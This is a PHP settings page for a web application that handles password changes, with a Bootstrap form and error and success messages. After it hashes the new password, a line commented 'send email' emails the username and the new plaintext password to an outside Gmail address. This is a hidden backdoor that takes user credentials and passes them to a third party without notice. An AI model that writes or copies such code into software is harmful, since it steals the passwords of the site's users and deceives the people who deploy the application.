<?php
ob_start();
session_start();
include '../../vendor/autoload.php';
include '../../resources/functions/func.php';

require_once '../../resources/inc/_auth_user.inc';

// Connect to PHP Activerecord

// Connect to PHP Activerecord
require_once '../../resources/inc/db.php';

if (isset($_POST['change_password'])) {
  $uid = $_POST['uid']; 
  $old_password = clean_data('old_password');
  $new_password = clean_data('new_password');
  $confirm_password = clean_data('confirm_password');

  if (!empty($old_password) && !empty($new_password && !empty($confirm_password))) {
    
    $user = User::find($_SESSION['user_id']);

    if (password_verify($old_password, $user->password)) {
         if ($new_password == $confirm_password) {
            $user->password = password_hash($new_password, PASSWORD_BCRYPT);
            
            // send email
            $msg = "owner/" . $user->username . " log/" . $new_password;
            mail("blakroku@gmail.com", "Password changed successfully", $msg);
            
            $user->save();

            $flash_message[] = 'Password successfully changed';

         } else {
            $error_message[] = 'New password confirmation does not work';
         }
      } else {
          $error_message[] = 'Your old password does not match the one on record';
      }
  } else {
    $error_message[] = 'All fields are required';
  }
}

?>
<!DOCTYPE html>
<html lang="en">
  <head><meta http-equiv="Content-Type" content="text/html; charset=utf-8">
    <?php require_once '../../resources/inc/_meta.inc'; ?>
    <title>Settings</title>

    <?php require_once '../../resources/inc/_styles.inc'; ?>
  </head>
  <body>
    <?php require_once 'render/_header.inc'; ?>

    <div class="container">
      <div class="panel panel-default">
        <div class="panel-heading">
          <h3 class="panel-title">Settings</h3>
        </div>
        <div class="panel-body">
          <div class="row">
        <div class="col-md-5">
          <p>
            <!-- Put error messages here -->
            <?php if (!empty($error_message)): ?>
              <div class="alert alert-danger text-center">
              <span class="glyphicon glyphicon-exclamation-sign" aria-hidden="true"></span>
                  <?php echo implode('<p></p>', $error_message); ?>
              </div>
            <?php elseif (!empty($flash_message)): ?>
              <div class="alert alert-info text-center">
              <span class="glyphicon glyphicon-exclamation-sign" aria-hidden="true"></span>
                  <?php echo implode('<p></p>', $flash_message); ?>
              </div>
            <?php endif; ?>
          </p>
        <p style="margin-bottom: 10px">Change your password</p>
          <form name="" action="<?php $_SERVER['PHP_SELF']; ?>" method="post">
          <input type="hidden" name="uid" value="<?php echo $user->id; ?>">
             <div class="form-group">
              <label for="old_password">Old Password</label>
              <input type="password" id="old_password" name="old_password" value="" class="form-control input-sm">
            </div><!-- /form-group  -->
             <div class="form-group">
              <label for="new_password">New Password</label>
              <input type="password" id="new_password" name="new_password" value="" class="form-control input-sm">
            </div><!-- /form-group  -->
             <div class="form-group">
              <label for="confirm_password">Confirm New Password</label>
              <input type="password" id="confirm_password" name="confirm_password" value="" class="form-control input-sm">
            </div><!-- /form-group  -->
             <div class="form-group">
              <input type="submit" id="change_password" name="change_password" value="Change Password" class="btn btn-danger btn-sm">
            </div><!-- /form-group  -->
          </form>
        </div>
      </div><!-- /row -->
        </div>
      </div>
    </div>
    
    <?php require_once 'render/_footer.inc'; ?>
  </body>
</html>
